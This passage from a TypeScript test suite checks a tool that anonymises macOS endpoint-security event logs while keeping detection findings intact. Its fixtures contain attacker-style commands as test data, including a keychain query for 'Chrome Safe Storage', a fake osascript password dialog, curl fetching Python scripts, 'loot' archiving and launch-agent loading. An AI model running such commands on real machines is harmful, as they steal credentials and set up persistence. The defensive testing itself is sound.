      esCreate(zsh, { path: '/Users/jdoe/Projects/.git/hooks/pre-commit' }, 5),
      esCreate(zsh, { path: '/Users/jdoe/Library/LaunchAgents/com.jdoe.agent.plist' }, 6),
      esBtm(btmd, { itemUrl: 'file:///Users/jdoe/Library/LaunchAgents/com.jdoe.agent.plist', executablePath: '/Users/jdoe/Applications/Foo.app/Contents/MacOS/Foo', itemType: 1 }, 7),
      esExec(zsh, agent, { args: ['/Users/jdoe/Applications/Foo.app/Contents/MacOS/Foo'], cwd: '/var/folders/ab/cdef/T/', env: JDOE_ENV, seq: 8 }),
      esExec(zsh, moved, { args: [translocated], cwd: '/', env: JDOE_ENV, seq: 9 }),
      // Names that look like bundle IDs, but in Documents: a person's files, not an app's.
      esCreate(zsh, { path: '/Users/jdoe/Documents/first.last.resume.pdf' }, 10),
      esCreate(zsh, { path: '/Users/jdoe/Documents/com.acme.secret-plan.docx' }, 11),
      // Home folders named like system ones do not change system paths.
      esCreate(zsh, { path: '/Users/jdoe/homebrew/bin/tool' }, 12),
      esCreate(zsh, { path: '/Users/jdoe/Projects/usr/lib/System/x' }, 13),
      esExec(zsh, curl, { args: ['curl', '-o', '/usr/lib/libz.dylib'], cwd: '/System/Library/Frameworks', env: JDOE_ENV, seq: 14 }),
      esCreate(zsh, { path: '/Users/jdoe/Library/Developer/Xcode/DerivedData/App-abc/Build/x' }, 15),
    ].join('\n') + '\n';
    const raw = lines(input);
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    const created = (i: number): string => ev[i]!.event.create.destination.existing_file.path as string;
    expect(created(0)).toMatch(/^\/Users\/user1\/Downloads\/name\d+\.pkg$/);
    expect(created(1)).toMatch(/^\/Users\/Shared\/name\d+\.txt$/);
    expect(created(2)).toMatch(/^\/Users\/user1\/name\d+\/\.name\d+\/name\d+$/);
    expect(created(3)).toMatch(/^\/Users\/user1\/name\d+\/node_modules\/\.name\d+\/name\d+$/);
    expect(created(4)).toMatch(/^\/Users\/user1\/name\d+\/\.git\/name\d+\/name\d+$/);
    expect(created(5)).toBe('/Users/user1/Library/LaunchAgents/com.user1.agent.plist');
    expect(ev[6]!.event.btm_launch_item_add.item.item_url).toBe('file:///Users/user1/Library/LaunchAgents/com.user1.agent.plist');
    expect(ev[6]!.event.btm_launch_item_add.executable_path).toBe('/Users/user1/Applications/Foo.app/Contents/MacOS/Foo');
    expect(ev[7]!.event.exec.target.executable.path).toBe('/Users/user1/Applications/Foo.app/Contents/MacOS/Foo');
    expect(ev[7]!.event.exec.cwd.path).toBe('/var/folders/ab/cdef/T/');
    expect(ev[8]!.event.exec.target.executable.path).toBe(translocated);
    expect(ev[8]!.event.exec.args).toEqual([translocated]);
    expect(created(9)).toMatch(/^\/Users\/user1\/Documents\/name\d+\.pdf$/);
    expect(created(10)).toMatch(/^\/Users\/user1\/Documents\/name\d+\.docx$/);
    expect(created(11)).toMatch(/^\/Users\/user1\/name\d+\/bin\/name\d+$/);
    expect(created(12)).toMatch(/^\/Users\/user1\/name\d+\/usr\/lib\/System\/name\d+$/);
    expect(ev[13]!.event.exec.args).toEqual(['curl', '-o', '/usr/lib/libz.dylib']);
    expect(ev[13]!.event.exec.cwd.path).toBe('/System/Library/Frameworks');
    expect(created(14)).toMatch(/^\/Users\/user1\/Library\/Developer\/name\d+\/DerivedData\/name\d+\/name\d+\/name\d+$/);
    // PATH lists are cleaned entry by entry.
    expect(ev[7]!.event.exec.env).toContain('HOME=/Users/user1');
    expect(ev[7]!.event.exec.env.find((e: string) => e.startsWith('PATH='))).toMatch(/^PATH=\/usr\/bin:\/bin:\/Users\/user1\/\.name\d+\/shims$/);
    expect(findingSignature(buildModel(lines(r.out)))).toEqual(findingSignature(buildModel(raw)));
  });

  test('programs that ran keep their names', () => {
    // Each program runs in its own process: a shell child (pid N) execs it (pid N, a new pidversion).
    const child = (pid: number): ReturnType<typeof esProc> => esProc({ pid, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh', ppid: 300 });
    const image = (pid: number, p: string): ReturnType<typeof esProc> => userProc(pid, p, { pidversion: pid + 2000 });
    const input = [
      esExec(child(400), image(400, '/Users/jdoe/homebrew/bin/curl'), { args: ['curl', '-o', 'x', 'https://example.com/a.py'], cwd: '/Users/jdoe/Downloads', env: JDOE_ENV, seq: 1 }),
      esExec(child(401), image(401, '/Users/jdoe/.pyenv/shims/python3'), { args: ['python3'], cwd: '/Users/jdoe/Downloads', env: JDOE_ENV, stdinPipe: true, seq: 2 }),
      esExec(child(402), image(402, '/Users/jdoe/.nvm/versions/node/v22.0.0/bin/node'), { args: ['node', '-e', 'require("child_process")'], cwd: '/Users/jdoe/Projects', env: JDOE_ENV, seq: 3 }),
      esExec(child(403), image(403, '/Users/jdoe/Downloads/Zoom_Installer'), { args: ['/Users/jdoe/Downloads/Zoom_Installer'], cwd: '/Users/jdoe/Downloads', env: JDOE_ENV, seq: 4 }),
      // From now on these names stay, in any path.
      esCreate(zsh, { path: '/Users/jdoe/Documents/Zoom_Installer' }, 5),
      esCreate(zsh, { path: '/Users/jdoe/Documents/curl/node' }, 6),
    ].join('\n') + '\n';
    const raw = lines(input);
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    expect(ev.map(e => e.event.exec?.target.executable.path)).toEqual([
      '/Users/user1/homebrew/bin/curl'.replace('homebrew', keyed(r.key, 'name').get('homebrew')!),
      expect.stringMatching(/^\/Users\/user1\/\.name\d+\/shims\/python3$/),
      expect.stringMatching(/^\/Users\/user1\/\.name\d+\/versions\/node\/name\d+\/bin\/node$/),
      '/Users/user1/Downloads/Zoom_Installer',
      undefined, undefined,
    ]);
    expect(ev[3]!.event.exec.args).toEqual(['/Users/user1/Downloads/Zoom_Installer']);
    expect(ev[4]!.event.create.destination.existing_file.path).toBe('/Users/user1/Documents/Zoom_Installer');
    expect(ev[5]!.event.create.destination.existing_file.path).toBe('/Users/user1/Documents/curl/node');
    const sig = findingSignature(buildModel(raw));
    expect(sig.size).toBeGreaterThan(2);
    expect(findingSignature(buildModel(lines(r.out)))).toEqual(sig);
  });

  // Read from standard input there is no prescan, so the name is only known as a program once it has run.
  test('without the prescan, a name that had a placeholder before its program ran keeps it in the key, and is kept from then on', () => {
    const child = esProc({ pid: 410, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh', ppid: 300 });
    const dropper = userProc(410, '/Users/jdoe/Downloads/Zoom_Installer', { pidversion: 2410 });
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Downloads/Zoom_Installer' }, 1),
      esExec(child, dropper, { args: ['/Users/jdoe/Downloads/Zoom_Installer'], cwd: '/Users/jdoe/Downloads', env: JDOE_ENV, seq: 2 }),
      esCreate(zsh, { path: '/Users/jdoe/Downloads/Zoom_Installer' }, 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-i', '-', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ph = keyed(r.key, 'name').get('Zoom_Installer');
    expect(ph).toMatch(/^name\d+$/);
    const ev = events(r.out);
    expect(ev[0]!.event.create.destination.existing_file.path).toBe(`/Users/user1/Downloads/${ph}`);
    expect(ev[1]!.event.exec.target.executable.path).toBe('/Users/user1/Downloads/Zoom_Installer');
    expect(ev[2]!.event.create.destination.existing_file.path).toBe('/Users/user1/Downloads/Zoom_Installer');
  });

  test('a volume named like a standard folder does not rename that folder in a home', () => {
    const child = esProc({ pid: 420, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh', ppid: 300 });
    const tool = userProc(420, '/Users/jdoe/Downloads/tool', { pidversion: 2420 });
    const input = [
      esCreate(zsh, { path: '/Volumes/Downloads/x' }, 1),
      esExec(child, tool, { args: ['/Users/jdoe/Downloads/tool'], cwd: '/Users/jdoe/Downloads', env: JDOE_ENV, seq: 2 }),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    expect(ev[0]!.event.create.destination.existing_file.path).toMatch(/^\/Volumes\/vol1\/name\d+$/);
    expect(ev[1]!.event.exec.target.executable.path).toBe('/Users/user1/Downloads/tool');
    expect(ev[1]!.event.exec.cwd.path).toBe('/Users/user1/Downloads');
    expect(findingSignature(buildModel(lines(r.out)))).toEqual(findingSignature(buildModel(lines(input))));
  });

  test('a launch agent plist keeps its name in its path and its %-escaped registration URL, and the findings stay', () => {
    const btmd = sysProc(330, '/System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Resources/backgroundtaskmanagementd');
    const sh = sysProc(350, '/bin/sh');
    const input = [
      esCreate(sh, { path: '/Users/jdoe/Library/LaunchAgents/My Agent.plist' }, 1),
      esBtm(btmd, { itemUrl: 'file:///Users/jdoe/Library/LaunchAgents/My%20Agent.plist', executablePath: '/Users/jdoe/Downloads/Zoom_Installer', itemType: 1 }, 2),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    expect(ev[0]!.event.create.destination.existing_file.path).toBe('/Users/user1/Library/LaunchAgents/My Agent.plist');
    expect(ev[1]!.event.btm_launch_item_add.item.item_url).toBe('file:///Users/user1/Library/LaunchAgents/My%20Agent.plist');
    expect(findingSignature(buildModel(lines(r.out)))).toEqual(findingSignature(buildModel(lines(input))));
  });

  test('app and vendor folders under ~/Library are kept, what they hold is cleaned, and system places keep their names', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Library/Application Support/Slack/storage/Secret Plan.json' }, 1),
      esCreate(zsh, { path: '/Users/jdoe/Library/Mail/V10/Inbox Board.emlx' }, 2),
      esCreate(zsh, { path: '/Users/jdoe/homebrew/x' }, 3),
      esCreate(zsh, { path: '/opt/homebrew/bin/brew' }, 4),
      esCreate(zsh, { path: '/Library/Application Support/Slack/y' }, 5),
      esCreate(zsh, { path: '/Library/Logs/jdoe/com.jdoe.helper.log' }, 6),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const p = events(r.out).map(e => e.event.create.destination.existing_file.path as string);
    expect(p[0]).toMatch(/^\/Users\/user1\/Library\/Application Support\/Slack\/name\d+\/name\d+\.json$/);
    expect(p[1]).toMatch(/^\/Users\/user1\/Library\/Mail\/name\d+\/name\d+\.emlx$/);
    expect(p[2]).toMatch(/^\/Users\/user1\/name\d+\/name\d+$/);
    // In system and app places only account names are replaced, not names mapped in a home.
    expect(p[3]).toBe('/opt/homebrew/bin/brew');
    expect(p[4]).toBe('/Library/Application Support/Slack/y');
    expect(p[5]).toBe('/Library/Logs/user1/com.user1.helper.log');
  });

  test('names that only look like bundle IDs or team groups are a person\'s files', () => {
    const mail = '/Users/jdoe/Library/Containers/com.apple.mail/Data/Library/Mail Downloads/0A1B2C3D-0000-1111-2222-333344445555';
    const input = [
      esCreate(zsh, { path: `${mail}/CONTRACT01.pdf` }, 1),
      esCreate(zsh, { path: `${mail}/me.and.jane.smith.jpg` }, 2),
      esCreate(zsh, { path: '/tmp/it.budget.cuts.xlsx' }, 3),
      esCreate(zsh, { path: '/private/tmp/com.apple.launchd.AbC123/Listeners' }, 4),
      esCreate(zsh, { path: '/Users/jdoe/Documents/AppTranslocation/Board Secrets.pdf' }, 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const p = events(r.out).map(e => e.event.create.destination.existing_file.path as string);
    expect(p[0]).toMatch(/^\/Users\/user1\/Library\/Containers\/com\.apple\.mail\/Data\/Library\/name\d+\/name\d+\/name\d+\.pdf$/);
    expect(p[1]).toMatch(/\/name\d+\.jpg$/);
    expect(p[2]).toMatch(/^\/tmp\/name\d+\.xlsx$/);
    expect(p[3]).toMatch(/^\/private\/tmp\/com\.apple\.launchd\.AbC123\/name\d+$/);
    expect(p[4]).toMatch(/^\/Users\/user1\/Documents\/name\d+\/name\d+\.pdf$/);
    for (const s of ['CONTRACT01', 'jane', 'budget', 'Secrets']) expect(r.out).not.toContain(s);
  });

  test('a & in a path does not cut it, in an argument, an environment value or a path field', () => {
    const open = sysProc(311, '/usr/bin/open');
    const input = esExec(zsh, open, {
      args: ['open', '/Users/jdoe/Documents/M&A Plan/Board Deck.pdf', '--in=/Users/jdoe/Documents/P&L 2026.xlsx'],
      cwd: '/Users/jdoe/R&D/Prototype', env: [...JDOE_ENV, 'OLDPWD=/Users/jdoe/R&D/Prototype'], seq: 1,
    }) + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const names = keyed(r.key, 'name');
    for (const n of ['M&A Plan', 'Board Deck.pdf', 'P&L 2026.xlsx', 'R&D', 'Prototype']) expect(names.has(n), n).toBe(true);
    const exec = events(r.out)[0]!.event.exec;
    expect(exec.args).toEqual(['open', `/Users/user1/Documents/${names.get('M&A Plan')}/${names.get('Board Deck.pdf')}`,
      `--in=/Users/user1/Documents/${names.get('P&L 2026.xlsx')}`]);
    expect(exec.cwd.path).toBe(`/Users/user1/${names.get('R&D')}/${names.get('Prototype')}`);
    expect(exec.env).toContain(`OLDPWD=${exec.cwd.path}`);
  });

  test('a path with extra leading slashes, or ~name/, is cleaned; a URL\'s //host is left for the host step', () => {
    const open = sysProc(312, '/usr/bin/open');
    const input = esExec(zsh, open, {
      args: ['open', '//Users/jdoe/Documents/Board.pdf', '~jdoe/Documents/Payroll.xlsx', 'https://example.com/a'],
      cwd: '//Users/jdoe/Secret', env: JDOE_ENV, seq: 1,
    }) + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const names = keyed(r.key, 'name');
    const exec = events(r.out)[0]!.event.exec;
    expect(exec.args).toEqual(['open', `//Users/user1/Documents/${names.get('Board.pdf')}`, `~user1/Documents/${names.get('Payroll.xlsx')}`,
      'https://example.com/a']);
    expect(exec.cwd.path).toBe(`//Users/user1/${names.get('Secret')}`);
  });

  test('what follows a system path in a chained or quoted string is cleaned', () => {
    const sh = sysProc(313, '/bin/sh');
    const chained = ['/usr/bin/x;/Users/jdoe/Secret', '/usr/bin/x&&/Users/jdoe/Secret', '/usr/bin/x<>/Users/jdoe/Secret3',
      'FOO=/bin/ls;/Users/jdoe/Secret3', '/usr/bin/open "/Users/jdoe/Quoted Secret/z"'];
    const input = esExec(zsh, sh, { args: ['sh', ...chained], cwd: '/', env: [...JDOE_ENV, 'FOO=/bin/ls;/Users/jdoe/Secret3'], seq: 1 }) + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const names = keyed(r.key, 'name');
    const exec = events(r.out)[0]!.event.exec;
    expect(exec.args).toEqual(['sh', `/usr/bin/x;/Users/user1/${names.get('Secret')}`, `/usr/bin/x&&/Users/user1/${names.get('Secret')}`,
      `/usr/bin/x<>/Users/user1/${names.get('Secret3')}`, `FOO=/bin/ls;/Users/user1/${names.get('Secret3')}`,
      `/usr/bin/open "/Users/user1/${names.get('Quoted Secret')}/${names.get('z')}"`]);
    expect(exec.env).toContain(`FOO=/bin/ls;/Users/user1/${names.get('Secret3')}`);
    expect(r.out).not.toMatch(/jdoe|Secret/);
  });

  test('~root/ and other system accounts get no account placeholder, so /var/root stays', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/x' }, 1),
      esExec(zsh, sysProc(314, '/usr/bin/open'), { args: ['open', '~root/Library/x', '~_www/y', '~jdoe/Documents/z.txt'], cwd: '/', env: JDOE_ENV, seq: 2 }),
      esCreate(zsh, { path: '/var/root/Library/LaunchDaemons/y.plist' }, 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    expect(keyed(r.key, 'user')).toEqual(new Map([['jdoe', 'user1']]));
    const ev = events(r.out);
    expect(ev[1]!.event.exec.args.slice(1, 3)).toEqual(['~root/Library/x', `~_www/${keyed(r.key, 'name').get('y')}`]);
    expect(ev[2]!.event.create.destination.existing_file.path).toBe('/var/root/Library/LaunchDaemons/y.plist');
  });

  test('a name placeholder keeps only a common file extension, never a personal word or an account name', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/x' }, 1),
      esCreate(zsh, { path: '/Users/Shared/Jane.Smith/notes.jdoe' }, 2),
      esCreate(zsh, { path: '/Users/Shared/Board.pdf' }, 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const names = keyed(r.key, 'name');
    expect(names.get('Jane.Smith')).toMatch(/^name\d+$/);
    expect(names.get('notes.jdoe')).toMatch(/^name\d+$/);
    expect(names.get('Board.pdf')).toMatch(/^name\d+\.pdf$/);
    expect(r.out).not.toMatch(/smith|jdoe/i);
  });

  test('same findings: the synthetic-lab fixture and the lab script\'s synthetic capture', () => {
    const lab = spawnSync('/bin/bash', [path.resolve(__dirname, '..', 'scripts', 'gameleira-lab.sh'), 'synthetic', '--stdout']).stdout.toString('utf8');
    for (const [input, user] of [[fs.readFileSync(SYNTHETIC, 'utf8'), 'alice'], [lab, 'learner']] as const) {
      const r = runClean(['clean', '-o', '-'], { input });
      expect(r.status, r.stderr).toBe(0);
      expect(keyed(r.key, 'user').get(user)).toBe('user1');
      const raw = findingSignature(buildModel(lines(input)));
      expect(raw.size).toBeGreaterThan(5);
      expect(findingSignature(buildModel(lines(r.out)))).toEqual(raw);
    }
  });

  test('same output every run, for the same input and a fresh key', () => {
    const a = runClean(['clean', '-o', '-'], { input: leakInput });
    const b = runClean(['clean', '-o', '-'], { input: leakInput });
    expect(a.out).not.toBe('');
    expect(b.out).toBe(a.out);
    expect(b.key).toBe(a.key);
  });

  test('a loaded key keeps its placeholders, and new names are numbered after it', () => {
    const dir = tmpDir();
    const key = path.join(dir, 'shared.key.tsv');
    fs.writeFileSync(key, 'kind\tplaceholder\treal\nuser\tuser1\t"jdoe"\nname\tname4.pdf\t"Q3-acquisition.pdf"\n');
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Q3-acquisition.pdf' }, 1),
      esCreate(zsh, { path: '/Users/jdoe/Documents/Merger.key' }, 2),
      esCreate(zsh, { path: '/Users/kim/Desktop/x' }, 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-', '-k', key], { input });
    expect(r.status, r.stderr).toBe(0);
    expect(events(r.out).map(e => e.event.create.destination.existing_file.path)).toEqual([
      '/Users/user1/Documents/name4.pdf', '/Users/user1/Documents/name5.key', '/Users/user2/Desktop/name6',
    ]);
    expect(parseKey(r.key).slice(2)).toEqual([
      { kind: 'name', placeholder: 'name5.key', real: 'Merger.key' },
      { kind: 'user', placeholder: 'user2', real: 'kim' },
      { kind: 'name', placeholder: 'name6', real: 'x' },
    ]);
    expect(r.summary['placeholders name']).toBe('2');
    expect(r.summary['placeholders user']).toBe('1');
  });
});

// ---- arguments and text -----------------------------------------------------------------------------------------
describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
  // Each program runs in its own process: a shell child (pid N) execs it (pid N, a new pidversion).
  const child = (pid: number): ReturnType<typeof esProc> => esProc({ pid, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh', ppid: 300 });
  const sysImage = (pid: number, p: string): ReturnType<typeof esProc> =>
    esProc({ pid, pidversion: pid + 2000, path: p, platform: true, signingId: `com.apple.${p.split('/').pop()!}`, ppid: 300 });
  const run = (pid: number, p: string, args: string[], cwd: string, seq: number, extra: { stdinPipe?: boolean } = {}): string =>
    esExec(child(pid), sysImage(pid, p), { args, cwd, env: JDOE_ENV, seq, ...extra });
  const sameFindings = (raw: string, out: string): void => {
    const sig = findingSignature(buildModel(lines(raw)));
    expect(findingSignature(buildModel(lines(out)))).toEqual(sig);
  };

  test('clean -i - reads standard input', () => {
    const r = runClean(['clean', '-i', '-', '-o', '-'], { input: fs.readFileSync(SYNTHETIC, 'utf8') });
    expect(r.status, r.stderr).toBe(0);
    expect(lines(r.out)).toHaveLength(synthLines().length);
    expect(r.summary['raw capture, left as it was']).toBe('(standard input)');
  });

  test('relative arguments under a cleaned cwd are cleaned', () => {
    const input = [
      run(500, '/usr/bin/zip', ['zip', '-r', 'board.zip', 'Q3 Financials', '--out=Minutes.pdf', './Offsite/Agenda.docx', '../Merger.key'],
        '/Users/jdoe/Documents', 1),
      esCreate(zsh, { path: '/Users/jdoe/Documents/Q3 Financials/x.xlsx' }, 2),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const names = keyed(r.key, 'name');
    const ev = events(r.out);
    const args = ev[0]!.event.exec.args as string[];
    expect(args).toHaveLength(7);
    expect(args.slice(0, 2)).toEqual(['zip', '-r']);
    expect(args[2]).toMatch(/^name\d+\.zip$/);
    expect(args[3]).toBe(names.get('Q3 Financials'));
    expect(args[4]).toMatch(/^--out=name\d+\.pdf$/);
    expect(args[5]).toMatch(/^\.\/name\d+\/name\d+\.docx$/);
    expect(args[6]).toMatch(/^\.\.\/name\d+\.key$/);
    // The same name in a full path gets the same placeholder.
    expect(ev[1]!.event.create.destination.existing_file.path).toBe(`/Users/user1/Documents/${names.get('Q3 Financials')}/${names.get('x.xlsx')}`);
    for (const s of ['board', 'Q3', 'Financials', 'Minutes', 'Offsite', 'Agenda', 'Merger']) expect(r.out, s).not.toContain(s);
  });

  test('a relative argv[0] has its folders cleaned and keeps its program name', () => {
    const tool = userProc(506, '/usr/local/bin/tool', { pidversion: 2506 });
    const input = [
      esExec(child(506), tool, { args: ['./Q3 Kit/tool', '-v'], cwd: '/Users/jdoe/Documents', env: JDOE_ENV, seq: 1 }),
      esExec(child(507), tool, { args: ['tool', 'x'], cwd: '/Users/jdoe/Documents', env: JDOE_ENV, seq: 2 }),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    expect(ev[0]!.event.exec.args).toEqual([`./${keyed(r.key, 'name').get('Q3 Kit')}/tool`, '-v']);
    expect(ev[1]!.event.exec.args).toEqual(['tool', 'x']);
    expect(r.out).not.toContain('Q3');
  });

  // An argument the keychain rule matches as a phrase stays for security, but is a name for any other program.
  test('rule phrases are kept for the program that the rule reads them from', () => {
    const input = [
      run(508, '/usr/bin/open', ['open', 'Exodus 14 notes.pdf'], '/Users/jdoe/Documents', 1),
      run(509, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Exodus 14 notes'], '/Users/jdoe/Documents', 2),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    expect(ev[0]!.event.exec.args).toEqual(['open', keyed(r.key, 'name').get('Exodus 14 notes.pdf')]);
    expect(ev[1]!.event.exec.args).toEqual(['security', 'find-generic-password', '-s', 'Exodus 14 notes']);
    sameFindings(input, r.out);
  });

  // Rules that resolve relative arguments against the cwd (archive staging, osascript from a file) see the same place.
  test('rules that read relative arguments against a strong cwd give the same findings', () => {
    const input = [
      run(580, '/usr/bin/zip', ['zip', '-r', 'out.zip', 'loot'], '/Users/jdoe/Downloads', 1),
      run(581, '/usr/bin/tar', ['tar', 'czf', 'x.tgz', '.hidden/data'], '/tmp/x', 2),
      run(582, '/usr/bin/osascript', ['osascript', 'collect.scpt'], '/Users/jdoe/Downloads', 3),
      run(583, '/usr/bin/osascript', ['osascript', 'collect.scpt'], '/tmp/x', 4),
      run(584, '/usr/bin/ditto', ['ditto', '-c', '-k', 'Board Files', 'board.zip'], '/Users/Shared', 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const sig = findingSignature(buildModel(lines(input)));
    expect(sig.size).toBeGreaterThan(3);
    expect(findingSignature(buildModel(lines(r.out)))).toEqual(sig);
    expect(r.out).not.toMatch(/collect|Board|board|hidden/);
  });

  test('under a cleaned cwd, URLs, launchctl targets, rule words and inline code stay', () => {
    const input = [
      run(501, '/usr/bin/curl', ['curl', '-H', 'Accept: text/html', '-o', 'x.py', 'https://example.com/a/b.py'], '/Users/jdoe/Desktop/Merger', 1),
      run(502, '/bin/launchctl', ['launchctl', 'bootstrap', 'gui/501', 'agent.plist'], '/Users/jdoe/Desktop/Merger', 2),
      run(503, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w'], '/Users/jdoe/Desktop/Merger', 3),
      run(504, '/usr/bin/osascript', ['osascript', '-e', 'display dialog "Board pack.pdf is ready" with hidden answer'], '/Users/jdoe/Desktop/Merger', 4),
      run(505, '/usr/bin/python3', ['python3', '-c', 'print 1 2.py'], '/Users/jdoe/Desktop/Merger', 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args[0]!.slice(0, 4)).toEqual(['curl', '-H', 'Accept: text/html', '-o']);
    expect(args[0]![4]).toMatch(/^name\d+\.py$/);
    expect(args[0]![5]).toBe('https://example.com/a/b.py');
    expect(args[1]!.slice(0, 3)).toEqual(['launchctl', 'bootstrap', 'gui/501']);
    expect(args[1]![3]).toMatch(/^name\d+\.plist$/);
    expect(args[2]).toEqual(['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w']);
    expect(args[3]).toEqual(['osascript', '-e', 'display dialog "Board pack.pdf is ready" with hidden answer']);
    expect(args[4]).toEqual(['python3', '-c', 'print 1 2.py']);
    sameFindings(input, r.out);
  });

  test('relative arguments under a kept cwd keep unknown names, and replace mapped ones', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Q3-acquisition.pdf' }, 1),
      run(510, '/bin/ls', ['ls', 'Foo', 'Q3-acquisition.pdf'], '/usr/local', 2),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    expect(events(r.out)[1]!.event.exec.args).toEqual(['ls', 'Foo', keyed(r.key, 'name').get('Q3-acquisition.pdf')]);
  });

  test('a mapped name is replaced in free text', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Q3-acquisition.pdf' }, 1),
      esCreate(zsh, { path: '/Users/jdoe/Documents/Board Deck.key' }, 2),
      esCreate(zsh, { path: '/Users/jdoe/Desktop/Merger/Z5' }, 3),
      run(520, '/usr/bin/osascript', ['osascript', '-e', 'tell app "Finder" to open "Q3-acquisition.pdf"',
        '-e', 'tell app "Keynote" to open "Board Deck.key" -- see Merger. Z5'], '/', 4),
      run(521, '/bin/sh', ['sh', '-c', 'cp Q3-acquisition.pdf Merger/;echo Merger'], '/', 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const names = keyed(r.key, 'name');
    const ev = events(r.out);
    expect(ev[3]!.event.exec.args).toEqual(['osascript', '-e', `tell app "Finder" to open "${names.get('Q3-acquisition.pdf')}"`,
      // Names shorter than 4 characters are only replaced inside paths.
      '-e', `tell app "Keynote" to open "${names.get('Board Deck.key')}" -- see ${names.get('Merger')}. Z5`]);
    expect(ev[4]!.event.exec.args).toEqual(['sh', '-c', `cp ${names.get('Q3-acquisition.pdf')} ${names.get('Merger')}/;echo ${names.get('Merger')}`]);
    for (const s of ['Q3', 'Board', 'Merger']) expect(r.out, s).not.toContain(s);
  });

  test('a name seen before its program ran', () => {
    const dropper = userProc(530, '/Users/jdoe/Downloads/Zoom_Installer', { pidversion: 2530 });
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Downloads/Zoom_Installer' }, 1),
      esExec(child(530), dropper, { args: ['/Users/jdoe/Downloads/Zoom_Installer'], cwd: '/Users/jdoe/Downloads', env: JDOE_ENV, seq: 2 }),
    ].join('\n') + '\n';
    // clean -i FILE looks for the programs first, so the name is kept everywhere, also as a pretty-printed export.
    const pretty = lines(input).map(l => JSON.stringify(JSON.parse(l), null, 2)).join('\n') + '\n';
    for (const viaFile of [runClean(['clean', '-o', '-'], { input }), runClean(['clean', '-o', '-'], { input: pretty })]) {
      expect(viaFile.status, viaFile.stderr).toBe(0);
      expect(keyed(viaFile.key, 'name').has('Zoom_Installer')).toBe(false);
      expect(events(viaFile.out)[0]!.event.create.destination.existing_file.path).toBe('/Users/user1/Downloads/Zoom_Installer');
      sameFindings(input, viaFile.out);
    }
    // From standard input there is no prescan: the name has a placeholder until the program runs, and findings stay.
    const viaStdin = runClean(['clean', '-i', '-', '-o', '-'], { input });
    expect(viaStdin.status, viaStdin.stderr).toBe(0);
    expect(keyed(viaStdin.key, 'name').has('Zoom_Installer')).toBe(true);
    sameFindings(input, viaStdin.out);
  });

  test('folders named after rule words do not break rules', () => {
    const input = [
      ...['Chrome', 'dialog', 'load', 'Volumes', 'Safe Storage', 'answer'].map((w, i) => esCreate(zsh, { path: `/Users/jdoe/Documents/${w}/x${i}.txt` }, i + 1)),
      run(540, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w'], '/Users/jdoe/Documents', 10),
      run(541, '/usr/bin/osascript', ['osascript', '-e', 'display dialog "Update needed" default answer "" with hidden answer'], '/Users/jdoe/Documents', 11),
      run(542, '/bin/launchctl', ['launchctl', 'load', '/Users/jdoe/Library/LaunchAgents/x.plist'], '/Users/jdoe/Documents', 12),
      run(543, '/bin/launchctl', ['launchctl', 'load', 'Volumes/x.plist'], '/Users/jdoe/Documents', 13),
      run(544, '/bin/sh', ['sh', '-c', 'echo Chrome Safe Storage; echo load dialog answer'], '/Users/jdoe/Documents', 14),
